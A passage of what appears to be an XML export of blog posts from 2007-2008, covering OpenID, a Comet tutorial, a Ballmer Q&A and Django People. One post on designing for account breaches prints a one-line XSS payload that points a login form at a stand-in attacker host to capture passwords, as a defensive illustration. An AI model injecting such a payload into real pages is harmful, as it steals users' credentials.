&lt;p&gt;The point I was trying to make (one which I've seen &lt;a href=&quot;http://www.holovaty.com/&quot;&gt;Adrian Holovaty&lt;/a&gt; make many times) is that if you take good care of your data you can slice and dice it in dozens of unexpected ways.&lt;/p&gt;

&lt;p&gt;Next up was &lt;a href=&quot;http://www.ljworld.com/&quot;&gt;LJWorld.com&lt;/a&gt;, which the team re-launched &lt;a href=&quot;http://www2.jeffcroft.com/sidenotes/2007/may/02/random-updates/&quot;&gt;last month&lt;/a&gt;. The new site continues the trend of &lt;a href=&quot;http://www2.ljworld.com/news/2007/jun/07/horsemen_sheriffs_officers_catch_elusive_wild_stal/#comments&quot;&gt;user comments&lt;/a&gt; on pretty much everything, and I demonstrated the funky new &lt;a href=&quot;http://www2.ljworld.com/multimedia/&quot;&gt;multimedia&lt;/a&gt; page which again illustrates the value of rich data models. The &lt;a href=&quot;http://www2.ljworld.com/elections/2007/apr/03/races/lawrence_city_commission/&quot;&gt;election results coverage&lt;/a&gt; and &quot;Minors in possession&quot; &lt;a href=&quot;http://www2.ljworld.com/data/alcohol_violations/mip/&quot;&gt;special report&lt;/a&gt; also got a mention.&lt;/p&gt;

&lt;p&gt;The final site I talked about was &lt;a href=&quot;http://www2.ljworld.com/marketplace/&quot;&gt;Marketplace&lt;/a&gt;, the brand new business directory listing over 4,000 local companies. It can provide a map of &lt;a href=&quot;http://www2.ljworld.com/marketplace/categories/health-care/chiropractors/&quot;&gt;all the chiropractors in town&lt;/a&gt;, along with their opening hours and contact details. Individual &lt;a href=&quot;http://www2.ljworld.com/marketplace/businesses/blue-heron/&quot; title=&quot;Blue Heron&quot;&gt;business listings&lt;/a&gt; can include events, photos, coupons, even &lt;a href=&quot;http://www2.ljworld.com/marketplace/businesses/wayne-larrys-sports-bar-grill/&quot;&gt;video ads&lt;/a&gt;. Business owners can claim their listings and add more information to them; one restaurant uploaded photos of &lt;a href=&quot;http://www2.ljworld.com/marketplace/businesses/wayne-larrys-sports-bar-grill/products/burgers/&quot;&gt;their entire menu&lt;/a&gt;.&lt;/p&gt;

&lt;p&gt;I concluded with a few points on how you can go around building sites like this, including the &quot;wouldn't it be cool if...&quot; development process and the importance of cheap labour (interns!) to reliably populating your database. I also threw in a plug for &lt;a href=&quot;http://www.djangoproject.com/&quot;&gt;Django&lt;/a&gt;; the automatic admin interface was developed especially to support the fast pace of development at the Journal-World.&lt;/p&gt;

&lt;p&gt;I finished up with a plug for the blogs of some of the current team, all well worth a look.&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;&lt;a href=&quot;http://www.jeffcroft.com/&quot;&gt;Jeff Croft&lt;/a&gt; (congrats on &lt;a href=&quot;http://www2.jeffcroft.com/blog/2007/jun/11/my-posses-broadway/&quot; title=&quot;My Posse's On Broadway&quot;&gt;the new gig&lt;/a&gt;!)&lt;/li&gt;
  &lt;li&gt;&lt;a href=&quot;http://www.b-list.org/&quot;&gt;James Bennett&lt;/a&gt;&lt;/li&gt;
  &lt;li&gt;&lt;a href=&quot;http://www.jacobian.org/&quot;&gt;Jacob Kaplan-Moss&lt;/a&gt;&lt;/li&gt;
  &lt;li&gt;&lt;a href=&quot;http://postneo.com/&quot;&gt;Matt Croydon&lt;/a&gt;&lt;/li&gt;
  &lt;li&gt;&lt;a href=&quot;http://www.playgroundblues.com/&quot;&gt;Nathan Borror&lt;/a&gt;&lt;/li&gt;
  &lt;li&gt;&lt;a href=&quot;http://mintchaos.com/&quot;&gt;Christian Metts&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;

&lt;object type=&quot;application/x-shockwave-flash&quot; data=&quot;https://s3.amazonaws.com:443/slideshare/ssplayer.swf?id=62151&amp;amp;doc=doing-local-right4543&quot; width=&quot;425&quot; height=&quot;348&quot;&gt;&lt;param name=&quot;movie&quot; value=&quot;https://s3.amazonaws.com:443/slideshare/ssplayer.swf?id=62151&amp;amp;doc=doing-local-right4543&quot; /&gt;&lt;/object&gt;

&lt;p&gt;&lt;a href=&quot;http://www.slideshare.net/simon/doing-local-right/download&quot;&gt;Full download&lt;/a&gt; (PDF) available from slideshare.&lt;/p&gt;</field>
		<field name="created">2007-06-11 22:46:18</field>
		<field name="comments_open">0</field>
	</row>

	<row>
		<field name="id">1566</field>
		<field name="title">A note about simple registration</field>
		<field name="slug">sreg</field>
		<field name="body">&lt;p&gt;&lt;a href=&quot;http://openid.net/specs/openid-simple-registration-extension-1_0.html&quot;&gt;Simple registration&lt;/a&gt; is an extension that allows OpenID consumers to ask your provider for extra information - your name, e-mail address, date of birth and so on.&lt;/p&gt;

&lt;p&gt;Unfortunately, the spec often causes confusion for implementers. Here's the tricky part:&lt;/p&gt;

&lt;blockquote cite=&quot;http://openid.net/specs/openid-simple-registration-extension-1_0.html&quot;&gt;
&lt;dl&gt;
&lt;dt&gt;openid.sreg.required:&lt;/dt&gt;
&lt;dd&gt;Comma-separated list of
	  field names which, if absent from the response, will
	  prevent the Consumer from completing the
	  registration without End User interaction.
&lt;/dd&gt;
&lt;dt&gt;openid.sreg.optional:&lt;/dt&gt;
&lt;dd&gt;Comma-separated list of
	  field names Fields that will be used by the Consumer, but
	  whose absence will not prevent the registration from
	  completing.
&lt;/dd&gt;
&lt;/dl&gt;
&lt;/blockquote&gt;

&lt;p&gt;This is often interpreted as meaning that you can pass along a list of required fields and be guaranteed that they will be handed back to you. This is not the case: some providers (&lt;a href=&quot;http://idproxy.net/&quot;&gt;idproxy.net&lt;/a&gt; for example) don't support simple registration at all; others (like &lt;a href=&quot;http://wordpres.com/&quot;&gt;WordPress.com&lt;/a&gt;) only support a subset of the fields, since they don't store details such as the user's postcode. If your provider insists on certain values being returned by simple registration, some of your potential users will be unable to sign in.&lt;/p&gt;

&lt;p&gt;The misunderstanding stems from the definition attached to the required field. When you make a simple registration request, you're providing &lt;em&gt;advice&lt;/em&gt; to the provider. You're essentially saying that the user is going to have to provide this data eventually in order to register with your service, so it would be really handy if the provider could send it over to you. If they don't, your application will have no choice but to ask the user for it directly.&lt;/p&gt;

&lt;p&gt;In other words, even if you specify required values you shouldn't expect them to come back every time.&lt;/p&gt;

&lt;p&gt;By far the best way to use simple registration is as a way of pre-filling a signup form for your user. Many applications ask the user to complete a short registration form the first time they sign in with their OpenID. Use simple registration to pre-fill some of those form values - that way, if it's not available (or some of the values are missing) your application logic doesn't really care, it's just one more form field that the user will have to complete themselves. &lt;a href=&quot;http://ma.gnolia.com/&quot;&gt;Ma.gnolia.com&lt;/a&gt; is a great example of a site that does the right thing.&lt;/p&gt;

&lt;p&gt;See also &lt;a href=&quot;http://openid.net/pipermail/general/2007-March/thread.html#1874&quot;&gt;this thread on the mailing list&lt;/a&gt; from back in March.&lt;/p&gt;</field>
		<field name="created">2007-06-30 21:28:30</field>
		<field name="comments_open">0</field>
	</row>

	<row>
		<field name="id">1568</field>
		<field name="title">Designing for a security breach</field>
		<field name="slug">designing</field>
		<field name="body">&lt;p&gt;&lt;em&gt;User account breaches are inevitable. We should take that in to account when designing our applications.&lt;/em&gt;&lt;/p&gt;

&lt;p&gt;My work with OpenID has lead me to think a lot harder about account security in general. Staying secure on the Web is surprisingly difficult, even for experienced internet users - which means the mainstream public are in a whole heap of trouble.&lt;/p&gt;

&lt;p&gt;Phishing is incredibly effective; the &lt;a href=&quot;http://www.vnunet.com/vnunet/news/2127105/brits-fail-online-phishing-test&quot; title=&quot;Brits fail online phishing test&quot;&gt;vast majority&lt;/a&gt; of people can't tell the difference between a phished version of a site and a real one, and applications don't help the situation by sending dozens of e-mails encouraging people to sign in or serving their legitimate login page on unrecognisable domains. Even worse, &lt;a href=&quot;http://www.facebook.com/&quot; title=&quot;Facebook&quot;&gt;many&lt;/a&gt; &lt;a href=&quot;http://www.linkedin.com/&quot; title=&quot;Linked In&quot;&gt;social&lt;/a&gt; &lt;a href=&quot;http://twitter.com/&quot; title=&quot;Twitter&quot;&gt;networking&lt;/a&gt; &lt;a href=&quot;http://www.dopplr.com/&quot; title=&quot;Dopplr&quot;&gt;sites&lt;/a&gt; actively &lt;em&gt;encourage&lt;/em&gt; bad security habits by asking users for their webmail username and password in order to scrape their address book for contacts.&lt;/p&gt;

&lt;p&gt;&lt;a href=&quot;http://en.wikipedia.org/wiki/Cross-site_request_forgery&quot;&gt;CSRF&lt;/a&gt; and &lt;a href=&quot;http://en.wikipedia.org/wiki/Cross-site_scripting&quot;&gt;XSS&lt;/a&gt; attacks (the latter which opens up the former even in the few sites that have CSRF protection) are everywhere, and make phishing for user passwords even easier. If you can inject the following XSS attack in to a login page all bets are off:&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;javascript&quot;&gt;document.forms[0].action='http://hax0r.example.com/capture.cgi'&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Your application may be perfectly secure, but if one of your users uses the same username and password on a less secure application that gets cracked or XSSd their account on your service can be compromised as well.&lt;/p&gt;

&lt;p&gt;Most worrying of all is the way most user's entire online identities are attached to a single webmail account. People often criticise OpenID for putting all of a user's eggs in one basket, but don't realise that for most people their e-mail already serves that purpose. Steal my mail account and you can use forgotten password requests to steal everything else. Here's &lt;a href=&quot;http://p1k3.com/2007/9/1&quot; title=&quot;Your paranoia is justified&quot;&gt;a nasty recent example&lt;/a&gt; of that happening with a Gmail account.&lt;/p&gt;

&lt;p&gt;(This is why I'm excited to see OpenID providers moving towards more secure methods of authentication such as &lt;a href=&quot;http://janrain.com/blog/2007/04/20/and-then-there-were-none-zero-passwords-with-client-certificates/&quot; title=&quot;And then there were none — Zero Passwords with Client Certificates&quot;&gt;client-side SSL certificates&lt;/a&gt; and two-factor authentication with &lt;a href=&quot;http://en.wikipedia.org/wiki/SecurID&quot;&gt;a physical token&lt;/a&gt;. Users can afford to have a stronger relationship with their OpenID provider than the other sites they sign in to. It would be nice to see the same authentication measures made available for popular webmail systems.)&lt;/p&gt;

&lt;p&gt;If your web application hosts any valuable information at all, it's prudent to expect that some significant proportion of your users will eventually have their accounts hijacked.&lt;/p&gt;

&lt;p&gt;This introduces some interesting design challenges. If we expect that at least some of our users' accounts will be compromised, what can we do to minimise the damage that an attacker can cause?&lt;/p&gt;

&lt;p&gt;Online privacy campaigners frequently call for data and account deletion to be irreversible, but paradoxically this makes for even more trouble if an account is hijacked. Maybe applications should experiment with &quot;root&quot; level passwords that must be entered to make irreversible changes to an account (emptying the trash can for example). Of course, that just makes the whole password problem twice as bad.&lt;/p&gt;

&lt;p&gt;I don't have any answers, but I'd love to see some discussion about this. Are there any best practices that have already emerged in this area?&lt;/p&gt;</field>
		<field name="created">2007-09-30 21:29:32</field>
		<field name="comments_open">0</field>
	</row>

	<row>
		<field name="id">1569</field>
		<field name="title">Questioning Steve Ballmer</field>
		<field name="slug">steve</field>
		<field name="body">&lt;p&gt;This morning I attended a half day briefing at Microsoft UK entitled &quot;The Online Opportunity - What Makes a Successful Web 2.0 Start-Up?&quot;. Despite the buzzword laden title the event was well worth the trip up from Brighton, mainly due to the Q&amp;amp;A with Steve Ballmer (a pretty rare opportunity).&lt;/p&gt;

&lt;p&gt;Of the other speakers my favourite was Brent Hoberman of &lt;a href=&quot;http://www.lastminute.com/&quot;&gt;lastminute.com&lt;/a&gt; and more recently &lt;a href=&quot;http://www.mydeco.com/&quot;&gt;mydeco.com&lt;/a&gt;. He presented without slides, choosing instead to simply blasting through dozens of lessons he learnt working on lastminute.com, both when it was a plucky startup and once it had morphed in to a large public company. Thankfully Jeremy &lt;a href=&quot;http://adactio.com/journal/1351/&quot; title=&quot;Microsoft in London&quot;&gt;took copious notes&lt;/a&gt;.&lt;/p&gt;

&lt;p&gt;I was lucky enough to get the opportunity to throw a question at Steve. I considered asking how he planned to lure open source developers (used to &lt;a href=&quot;http://simonwillison.net/2005/Nov/1/destiny/&quot;&gt;controlling their entire stack&lt;/a&gt;) back to Microsoft tools, but another question had touched on patents so instead I asked the following (paraphrased):&lt;/p&gt;

&lt;blockquote&gt;&lt;p&gt;This event is all about encouraging startups - but one of the biggest problems a startup faces is that it's almost impossible to invent anything without violating someone's patent. Big companies can use their patent portfolios to defend themselves, but small companies have no way to fight back. It's kind of like the Cold War.&lt;/p&gt;&lt;/blockquote&gt;

&lt;p&gt;Here are the points I can remember from Steve's answer:&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;
The patent system (in the US) was designed for the industrial revolution and altered once to deal with the pharmaceutical industry. It hasn't yet been updated for software, but some kind of change is obviously needed. That said, we shouldn't throw the baby out with the bath water - patents are still needed to encourage innovation in both large and small companies.&lt;/li&gt;
  &lt;li&gt;At the moment, it's hard to say if small or big companies benefit most. Steve thinks it's actually the smaller companies - it's rare for a big company to crush a small company with a patent, but you often hear about small companies with a patent and nothing to lose going after the big guys.&lt;/li&gt;
  &lt;li&gt;Microsoft are lobbying for patent reform both in the US and the European Union.&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;About half way through Steve's talk the current favourite Microsoft demos got an airing: &lt;a href=&quot;http://www.popfly.ms/&quot;&gt;Popfly&lt;/a&gt; (a mashup editor written in Silverlight, reminiscent of &lt;a href=&quot;http://pipes.yahoo.com/&quot;&gt;Yahoo! Pipes&lt;/a&gt;), &lt;a href=&quot;http://labs.live.com/Seadragon.aspx&quot;&gt;Seadragon&lt;/a&gt; and the awesome &lt;a href=&quot;http://labs.live.com/photosynth/&quot;&gt;Photosynth&lt;/a&gt;. I hadn't realised Photosynth was actually available for regular people to play with, although my attempts at getting it working with Parallels on my Mac have sadly failed.&lt;/p&gt;</field>
		<field name="created">2007-10-01 23:57:53</field>
		<field name="comments_open">0</field>
	</row>

	<row>
		<field name="id">1570</field>
		<field name="title">Figuring out OpenSocial</field>
		<field name="slug">opensocial</field>
		<field name="body">&lt;p&gt;So &lt;a href=&quot;http://code.google.com/apis/opensocial/&quot; title=&quot;OpenSocial&quot;&gt;it's out&lt;/a&gt;, and lots of people are talking about it, but I'm still trying to work out exactly what it is. There seem to be two parts to it: a standardised set of GData APIs for accessing lists of friends and their activities (like the Facebook news feed) and a bunch of JavaScript APIs for enabling developers to write hostable widgets and &quot;container sites&quot; to embed those widgets.&lt;/p&gt;

&lt;p&gt;Unfortunately the official documentation confuses things horribly by referring to Google Gadgets in various places. From that my guess is that the embedding part consists of externally hosted code running in an iframe, along with &lt;a href=&quot;http://tagneto.blogspot.com/2006/06/cross-domain-frame-communication-with.html&quot; title=&quot;&quot;&gt;the clever fragment hack&lt;/a&gt; to mediate controlled communication between the container site and the embedded widget (and bypass the same-domain restriction). Not sure how that would defend against a malicious widget that uses frame-busting to send the user to a completely new page though - Facebook rewrite and sanitise all of the CSS and JavaScript that they serve, but I seriously doubt Google's open source container API pack will include that level of sophistication.&lt;/p&gt;

&lt;p&gt;My other question at the moment is how much OpenSocial relates to the larger goal of an open social network, where import and export APIs allow people to easily move from network to network and still find their friends. I don't see anything in the GData People API that explicitly addresses the need to correlate the same user's account across multiple sites (it looks like it doesn't include an e-mail address for example) which seems to me to be pretty essential.&lt;/p&gt;

&lt;p&gt;Am I getting this right, or have I missed something important? I'd love to hear from people who have been properly briefed on all of this.&lt;/p&gt;</field>
		<field name="created">2007-11-02 10:29:25</field>
		<field name="comments_open">0</field>
	</row>

	<row>
		<field name="id">1571</field>
		<field name="title">Comet works, and it's easier than you think</field>
		<field name="slug">comet</field>
		<field name="body">&lt;p&gt;I gave &lt;a href=&quot;http://www.slideshare.net/simon/time-for-comet/&quot; title=&quot;Time for Comet? - slides on SlideShare&quot;&gt;a talk&lt;/a&gt; this morning at the Yahoo! Web Developer Summit on &lt;a href=&quot;http://cometdaily.com/&quot;&gt;Comet&lt;/a&gt;, &lt;a href=&quot;http://cometd.com/&quot;&gt;cometd&lt;/a&gt; and &lt;a href=&quot;http://svn.xantus.org/shortbus/trunk/bayeux/bayeux.html&quot;&gt;Bayeux&lt;/a&gt;. I've been trying to keep up with Comet ever since Alex &lt;a href=&quot;http://alex.dojotoolkit.org/?p=545&quot;&gt;coined the term&lt;/a&gt; last year, but it's only in the past few weeks that I've actually found some time to play with it myself. I was very impressed with what I found: the open source infrastructure for building and deploying Comet applications is surprisingly mature, and with just a few more improvements I can see Comet achieving much more widespread use.&lt;/p&gt;

&lt;p&gt;Comet is an umbrella term for any technique that allows a web server to &quot;push&quot; events down to a browser. You can think of it as an alternative to Ajax polling, with the benefit that events are relayed in almost real-time and &quot;wasted&quot; requests (when nothing has changed) are massively reduced. The name doesn't stand for anything; it's named after an American kitchen cleaner (a joke on Ajax).&lt;/p&gt;

&lt;p&gt;When you consider the hacks involved in getting Comet to work across the four major browsers it's miraculous that it works at all. In the talk I tried to illustrate the insanity with examples of browser hacks, mainly to show how totally absurd it all was. But while the solutions are mostly pretty terrifying, the fact that we're dealing with JavaScript (rather than CSS) means that we can abstract all of the nastiness away, ready to be replaced later on when browsers start introducing native support. Abstracting away the nastiness until the browsers catch up is something of an unofficial mission statement for the Dojo project, so you won't be surprised to hear that &lt;a href=&quot;http://dojotoolkit.org/&quot;&gt;Dojo&lt;/a&gt; offers excellent support for Comet.&lt;/p&gt;

&lt;h3&gt;The Bayeux protocol&lt;/h3&gt;

&lt;p&gt;For me the most exciting Comet development is the invention of &lt;a href=&quot;http://svn.xantus.org/shortbus/trunk/bayeux/bayeux.html&quot;&gt;the Bayeux protocol&lt;/a&gt;. Bayeux defines a standard protocol for Comet clients (both browsers and others) to communicate with a dedicated Comet server, using a simple but powerful publisher/subscriber architecture based around the concept of named channels. Clients can connect to a Bayeux server, subscribe to one or more channels, and then publish messages targeted at a channel. The server's job is to relay those messages to all clients subscribed to that channel.&lt;/p&gt;

&lt;p&gt;There are a number of things to like about this setup. Firstly, it means that all of the difficult parts of Comet (relaying real-time messages, coping with huge numbers of simultaneous connections) are kept separate from your regular architecture. You can keep developing and deploying applications in your preferred framework (Django, Rails, PHP on Apache or whatever) while the Bayeux server sits there as essentially a black box - clients can subscribe to it and you can use it to publish messages all without needing to customise the Comet server at all. If the Bayeux server implementation you chose doesn't work out for some reason you can swap it straight out for something else that supports the same protocol.&lt;/p&gt;

&lt;p&gt;The one thing missing from Bayeux at the moment is authentication. Out of the box, a Bayeux server will relay messages to a specific channel from any client to any other set of clients. This is an obvious flaw: if you're running a site where events such as &quot;a new comment has been added&quot; are broadcast out via Comet, you don't want just anyone to be able to imitate such messages and have them sent to all of your subscribed clients. Right now, Bayeux leaves it up to the individual servers to figure out how they will deal with this. I'd like to see the specification address this directly as without it a Bayeux server isn't much use in a real-world environment.&lt;/p&gt;

&lt;h3&gt;Getting started with Comet&lt;/h3&gt;

&lt;p&gt;If I've piqued your interest, the good news is that getting started with Comet is really, really easy. All you need is a running server that supports the Bayeux protocol. I tried out a number of options, but the first one that worked straight out of the box was Jetty 6.1, a Java web server that uses continuations to achieve high concurrent performance. Here's how to get Jetty up and running in a few easy steps:&lt;/p&gt;

&lt;ol&gt;
    &lt;li&gt;Download Jetty 6.1 (the first version to include a cometd implementation) from &lt;a href=&quot;http://www.mortbay.org/&quot;&gt;www.mortbay.org&lt;/a&gt;.&lt;/li&gt;
    &lt;li&gt;Install &lt;a href=&quot;http://maven.apache.org/&quot;&gt;Maven&lt;/a&gt;, a free build tool for Java (the &lt;a href=&quot;http://maven.apache.org/download.html&quot;&gt;download page&lt;/a&gt; has installation instructions).&lt;/li&gt;
    &lt;li&gt;Unzip Jetty (you can put it anywhere).&lt;/li&gt;
    &lt;li&gt;&lt;samp&gt;cd jetty-6.1.6/contrib/cometd/demo&lt;/samp&gt;&lt;/li&gt;
    &lt;li&gt;&lt;samp&gt;mvn jetty:run&lt;/samp&gt; - the first time you run this it will download a bunch of dependencies and then start up a Jetty server on port 8080.&lt;/li&gt;
    &lt;li&gt;Navigate to &lt;samp&gt;http://localhost:8080/&lt;/samp&gt; and you should see an index page linking to a number of Comet demo applications.&lt;/li&gt;
&lt;/ol&gt;

&lt;p&gt;Once you've played with the demos, building your own application is almost as easy. The code for the bundled examples lives in &lt;samp&gt;jetty-6.1.6/contrib/cometd/demo/src/main/webapp/examples&lt;/samp&gt; - I simply created a copy of the entire &lt;samp&gt;chat&lt;/samp&gt; directory and started building my own experiments from there.&lt;/p&gt;

&lt;h3&gt;Using dojox.cometd&lt;/h3&gt;

&lt;p&gt;If you look through the source of the chat application, it quickly becomes apparent that most of Comet boils down to just three methods:&lt;/p&gt;

&lt;ul&gt;
    &lt;li&gt;&lt;strong&gt;&lt;samp&gt;dojox.cometd.init(comet_server_url)&lt;/samp&gt;&lt;/strong&gt; initialises a connection to the given Comet server. The Bayeux handshake protocol is used to establish the most appropriate Comet method for the connecting browser; you don't have to worry about the details of the Comet connection at all.&lt;/li&gt;
    &lt;li&gt;&lt;strong&gt;&lt;samp&gt;dojox.cometd.subscribe('/channel', callback)&lt;/samp&gt;&lt;/strong&gt; subscribes a callback function to a named channel. Any time a message is sent to that channel the function will be called.&lt;/li&gt;
    &lt;li&gt;&lt;strong&gt;&lt;samp&gt;dojox.cometd.publish('/channel', json_object)&lt;/samp&gt;&lt;/strong&gt; sends (publishes) a new message to a named channel. The message can be any valid JSON data structure.&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;There are a few other methods relating to batching requests and disconnecting from the server, but the above three make up the bulk of any Comet application.&lt;/p&gt;

&lt;h3&gt;A Comet slideshow&lt;/h3&gt;

&lt;p&gt;In preparation for my talk I decided that I'd try to present my slides using a small Comet application. I ended up building a very simple slideshow tool - I exported my Keynote presentation as a sequence of images, then wrote a Comet client that listened for &quot;show this slide&quot; messages and another client (a master, which acted as my presenter view) that could publish those messages. You can see &lt;a href=&quot;http://www.flickr.com/photos/simon/2089105360/&quot;&gt;a screenshot of the master client&lt;/a&gt; on Flickr; in addition to &quot;next&quot; and &quot;previous&quot; buttons it also shows a small preview of the upcoming slide.&lt;/p&gt;

&lt;p&gt;The code for the client application (which I had running on the main projector screen, and also encouraged the audience to load on their laptops) boiled down to just a few lines of code. Here's the slideshow client in its entirety:&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;javascript&quot;&gt;dojo.require(&quot;dojox.cometd&quot;);
jQuery(function($) {
    dojox.cometd.init(&quot;http://example.com/cometd&quot;);
    dojox.cometd.subscribe(&quot;/slideshow/change&quot;, function(comet) {
        $('#currentSlide').attr('src', comet.data.src);
    });
});
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;The master client was only a little more complicated, due to the need to keep track of the full list of slide URLs (non-sequential, to discourage the audience from skipping ahead) as well as display the preview. That said, the core Comet functionality was wrapped up in a single function:&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;javascript&quot;&gt;function publishSlide(src) {
    dojox.cometd.publish(&quot;/slideshow/change&quot;, {
        'src': src
    });
}
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;The entire application took less than an hour to put together, which I think is a testament to the quality of the Bayeux implementation present in both Jetty and Dojo.&lt;/p&gt;

&lt;h3&gt;The future&lt;/h3&gt;

&lt;p&gt;Before taking a detailed look at Comet, my assumption was that the amount of complexity involved meant it was out of bounds to all but the most dedicated JavaScript hackers. I'm pleased to admit that I was wrong: Comet is probably about 90% of the way to being usable for mainstream projects, and the few remaining barriers (Bayeux authentication chief amongst them) are likely to be solved before too long. I expect to see many more sites start deploying Comet powered features over the next twelve months.&lt;/p&gt;</field>
		<field name="created">2007-12-05 16:22:20</field>
		<field name="comments_open">0</field>
	</row>

	<row>
		<field name="id">1572</field>
		<field name="title">Yahoo!, Flickr, OpenID and Identity Projection</field>
		<field name="slug">projection</field>
		<field name="body">&lt;p&gt;&lt;a href=&quot;http://www.readwriteweb.com/archives/flickr_to_authenticate_openid.php&quot;&gt;Via ReadWriteWeb&lt;/a&gt;, view source on &lt;a href=&quot;http://www.flickr.com/photos/simon/&quot;&gt;a Flickr photostream page&lt;/a&gt; and search for &quot;openid&quot; and you'll be rewarded with the following snippet:&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;html&quot;&gt;&amp;lt;link rel=&quot;openid2.provider&quot;
  href=&quot;https://open.login.yahooapis.com/openid/op/auth&quot; /&amp;gt;&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Which means that Flickr pages will very soon be able to act as &lt;a href=&quot;http://openid.net/&quot;&gt;OpenIDs&lt;/a&gt;. The provider isn't up and running just yet though; try authenticating with your Flickr OpenID on &lt;a href=&quot;http://jyte.com/auth/login&quot;&gt;Jyte.com&lt;/a&gt; and you'll get the following message:&lt;/p&gt;

&lt;blockquote&gt;&lt;p&gt;
Hey there! You have stopped by a bit sooner than we had expected. This feature is still being tested, so please check back in a few days.
&lt;/p&gt;&lt;/blockquote&gt;

&lt;p&gt;The URL of the server is interesting as well: it suggests that Yahoo!'s OpenID support is designed from the start to apply to more than just Flickr. I wouldn't be at all surprised to see similar links start to crop up on all kinds of other Yahoo! properties - anything that has a page which can be considered to represent a user account. This would make a lot of sense, because &lt;strong&gt;OpenID is good for more than just authentication&lt;/strong&gt;. The OpenID protocol allows a user to assert ownership of a URL. This can be used for SSO-style authentication, but it can also be used to prove ownership of a specific account to some other service, a concept I've been calling &lt;em&gt;identity projection&lt;/em&gt;.&lt;/p&gt;

&lt;p&gt;If users can easily project their Flickr, Upcoming or del.icio.us identities to other sites, developers can start to build all kinds of neat things. Mashups for one get a whole lot more interesting when new users can easily bring their existing profiles from other sites with them. With any luck we'll see Yahoo! start to adopt &lt;a href=&quot;http://oauth.net/&quot;&gt;OAuth&lt;/a&gt; for authenticated API calls (which is itself based in part on the &lt;a href=&quot;http://www.flickr.com/services/api/auth.spec.html&quot;&gt;Flickr auth API&lt;/a&gt;) in the not too distant future, opening up even more possibilities.&lt;/p&gt;

&lt;p&gt;A common misconception about OpenID is that it's only really useful if users stick to using one identity. I'd be happy to see every one of my online profiles acting as an OpenID, not for SSO authentication (I'll pick one &quot;primary&quot; OpenID to use for that) but so that I can selectively cross-pollinate some of my profiles to new services.&lt;/p&gt;

&lt;p&gt;Back to Yahoo!, another interesting new URL is &lt;a href=&quot;https://me.yahoo.com/&quot;&gt;https://me.yahoo.com/&lt;/a&gt;. Again, there's not much to see at the moment but it looks to me like this will become an endpoint for OpenID 2 directed identity. James Henstridge &lt;a href=&quot;http://blogs.gnome.org/jamesh/2007/10/23/openid-20/&quot;&gt;provides a useful explanation here&lt;/a&gt;, but the short version is that you'll be able to enter &quot;me.yahoo.com&quot; in to an OpenID field on a site and have Yahoo! pick an obfuscated, unique OpenID for your interactions with that site. This protects your privacy by preventing anyone from outside of Yahoo! from correlating your behaviour across multiple OpenID-enabled services, similar to how Yahoo!'s current &lt;a href=&quot;http://developer.yahoo.com/auth/&quot;&gt;BBAuth API&lt;/a&gt; provides applications with an opaque hash rather than a user's Yahoo! screen name.&lt;/p&gt;

&lt;p&gt;It looks like Yahoo! will only be supporting OpenID 2 and won't provide a fallback for OpenID 1.x consumers. This means you won't be able to use your Flickr OpenID on many existing consumer sites (including this blog), at least until they get around to updating their libraries. I expect Yahoo!'s implementation to be a major influence in encouraging OpenID 2 adoption.&lt;/p&gt;

&lt;p&gt;It's three weeks short of a year since I &lt;a href=&quot;http://simonwillison.net/2007/Jan/27/idproxy/&quot;&gt;launched idproxy.net&lt;/a&gt;, which provides Yahoo! account holders with a third-party OpenID via the BBAuth API. I couldn't be happier to see Yahoo! taking steps towards cutting out the middle man.&lt;/p&gt;</field>
		<field name="created">2008-01-07 23:33:39</field>
		<field name="comments_open">0</field>
	</row>

	<row>
		<field name="id">1573</field>
		<field name="title">Django People</field>
		<field name="slug">djangopeople</field>
		<field name="body">&lt;p&gt;I'm constantly surprised by the number of people I run in to at conferences (or even in one case on the train) who are using &lt;a href=&quot;http://www.djangoproject.com/&quot;&gt;Django&lt;/a&gt; but are completely invisible to the Django community.  It seems that this is the downside of having good documentation: many people just read it and start building, without ever showing their face on the mailing lists or IRC.&lt;/p&gt;

&lt;p&gt;So, &lt;a href=&quot;http://notes.natbat.net/&quot;&gt;Natalie&lt;/a&gt; and I have just launched &lt;a href=&quot;http://djangopeople.net/&quot;&gt;djangopeople.net&lt;/a&gt; - a site that encourages Django developers to create a profile and stamp themselves on a map. Every country in the world gets its &lt;a href=&quot;http://djangopeople.net/gb/&quot;&gt;own page&lt;/a&gt;, as does &lt;a href=&quot;http://djangopeople.net/us/ks/&quot;&gt;every US state&lt;/a&gt; (for the moment; I may add other country's regional subdivisions in the future). The focus of the site is firmly on location, and I'm hoping to add features in the future that encourage people to get involved with local Django user groups and meet like-minded developers.&lt;/p&gt;

&lt;p&gt;So, if you develop sites in Django head over there and create yourself a profile. If possible, upload a photo too - it makes the site look nice! Please leave any feedback or bug reports as comments on this post.&lt;/p&gt;</field>
		<field name="created">2008-01-23 02:00:58</field>
		<field name="comments_open">0</field>
	</row>

	<row>
		<field name="id">1574</field>
		<field name="title">Django People: OpenID and microformats</field>
		<field name="slug">upgrade</field>
		<field name="body">&lt;p&gt;In hindsight, it was a mistake to launch &lt;a href=&quot;http://djangopeople.net/&quot;&gt;Django People&lt;/a&gt; without support for &lt;a href=&quot;http://openid.net/&quot;&gt;OpenID&lt;/a&gt;. It was on the original feature list, but in the end I decided to cut any feature that wasn't completely essential in order to get the site launched before it drowned in an ocean of &quot;wouldn't-it-be-cool-ifs&quot;.&lt;/p&gt;

&lt;p&gt;I thought that, once launched, the site would see a small amount of activity from a few interested parties and I'd have plenty of time to catch up on the feature backlog. What I didn't expect was that &lt;a href=&quot;http://djangopeople.net/about/&quot;&gt;over 750 people&lt;/a&gt; would create profiles within the first 24 hours!&lt;/p&gt;

